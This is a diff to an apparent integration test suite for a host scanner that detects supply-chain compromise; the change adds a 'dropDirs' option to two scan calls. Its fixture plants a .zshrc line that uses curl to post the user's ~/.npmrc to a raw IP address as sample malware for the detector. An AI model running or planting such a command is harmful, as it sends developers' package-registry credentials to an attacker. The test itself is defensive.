@@ -168,7 +168,7 @@ describe("host scan integration", () => {
     );
     put(home, "LA/com.fine.plist", "<key>Program</key><string>/usr/bin/true</string>", new Date("2025-01-01"));
     put(home, ".zshrc", "export X=1\ncurl http://194.150.166.244:8080/exfil -d @~/.npmrc\n");
-    const r = await scanHost(AIKIDO_IOCS, walk([join(home, "nothing")]), none, { home, startupDirs: [la], skipLive: true, now: NOW });
+    const r = await scanHost(AIKIDO_IOCS, walk([join(home, "nothing")]), none, { home, startupDirs: [la], dropDirs: [], skipLive: true, now: NOW });
     const t = r.findings.map((f) => `${f.severity}: ${f.title}`);
     expect(t.some((x) => x.startsWith("suspicious: Risky startup item com.update.plist") && x.includes("downloads and runs a script"))).toBe(true);
     expect(t.some((x) => x.includes("com.fine.plist"))).toBe(false);
@@ -193,7 +193,7 @@ describe("host scan integration", () => {
         },
       ],
     };
-    const r = await scanHost(iocs, walk([home]), none, { home, startupDirs: [], skipLive: true, now: NOW });
+    const r = await scanHost(iocs, walk([home]), none, { home, startupDirs: [], dropDirs: [], skipLive: true, now: NOW });
     const sev = Object.fromEntries(r.findings.filter((f) => f.subject.includes("/")).map((f) => [f.subject.split("/").pop(), f.severity]));
     expect(sev).toEqual({ "Math_Symbol.js": "suspicious", ".ci-ab12cd.sh": "compromised" });
   });
